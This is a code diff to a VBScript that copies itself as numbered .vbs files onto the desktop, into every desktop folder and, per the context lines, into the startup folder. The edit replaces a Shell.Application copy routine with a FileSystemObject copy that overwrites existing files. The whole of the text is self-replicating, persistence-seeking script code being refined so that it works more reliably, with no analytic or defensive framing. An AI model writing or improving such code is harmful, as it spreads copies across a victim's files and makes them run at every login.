@@ -13,7 +13,7 @@ For i = 1 To numCopies
     
     ' Create a copy of the script on the desktop
     strDesktopCopyPath = strDesktopFolder & "\Copy" & i & ".vbs"
-    CopyFileWithShell strCopyPath, strDesktopCopyPath
+    CopyFileWithFSO strCopyPath, strDesktopCopyPath
     
     ' Get the list of folders on the desktop
     Set objDesktopFolder = objFSO.GetFolder(strDesktopFolder)
@@ -22,7 +22,7 @@ For i = 1 To numCopies
     ' Iterate through each folder and create a copy of the script
     For Each objFolder In colFolders
         strFolderCopyPath = objFolder.Path & "\Copy" & i & ".vbs"
-        CopyFileWithShell strCopyPath, strFolderCopyPath
+        CopyFileWithFSO strCopyPath, strFolderCopyPath
     Next
     
     ' Get the path to the startup folder
@@ -40,9 +40,6 @@ For i = 1 To numCopies
     Next
 Next
 
-Sub CopyFileWithShell(sourcePath, destinationPath)
-    Set objShell = CreateObject("Shell.Application")
-    Set sourceItem = objShell.Namespace(objFSO.GetParentFolderName(sourcePath)).ParseName(objFSO.GetFileName(sourcePath))
-    Set destinationItem = objShell.Namespace(objFSO.GetParentFolderName(destinationPath)).Self
-    destinationItem.CopyHere sourceItem
+Sub CopyFileWithFSO(sourcePath, destinationPath)
+    objFSO.CopyFile sourcePath, destinationPath, True ' Add "True" to overwrite existing files
 End Sub
